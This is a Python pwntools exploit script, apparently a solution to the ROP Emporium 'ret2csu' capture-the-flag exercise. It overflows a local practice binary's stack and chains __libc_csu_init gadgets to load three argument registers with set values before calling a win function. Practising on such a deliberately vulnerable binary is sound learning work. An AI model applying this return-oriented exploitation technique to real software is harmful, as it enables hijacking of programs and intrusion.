from pwn import *

#setup
bin='./ret2csu'
context.binary=bin
p=process(bin)

# step 1: pop rdi, rsi, rdx
# step 2: load arguments
# step 2.5: beat [r12+rbx*8]
# step 3: call ret2win

pop_rdi=0x4006a3 # pop rdi; ret;
mov_r15_rdx=0x400680 # mov rdx,r15; mov rsi,r14; mov edi,r13d; call QWORD PTR [r12+rbx*8]; and goes to "pop_rbx_r12" gadget by itself
pop_rbx_r12=0x40069a # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
pop_r15=0x4006a2

offset=40
dynamic = 0x600e48

rdi_val = 0xdeadbeefdeadbeef
rsi_val = 0xcafebabecafebabe
rdx_val = 0xd00df00dd00df00d

win=0x400510

payload = b'A'*offset
payload += p64(pop_rbx_r12)
payload += p64(0) + p64(1) + p64(dynamic) + p64(0) + p64(rsi_val) + p64(rdx_val) # for rbx, rbp, r12, r13, r14, r15 respectively
payload += p64(pop_rdi)
payload += p64(rdi_val)
payload += p64(mov_r15_rdx)
payload += p64(0) + p64(0) + p64(0) + p64(0) + p64(0) + p64(0) + p64(0)
payload += p64(pop_rdi)
payload += p64(rdi_val)
payload += p64(win)

#gdb.attach(p) #--- for debugging and watching the exploit step by step
p.sendafter(b'> ',payload)

p.sendline(payload)
print(p.clean().decode())
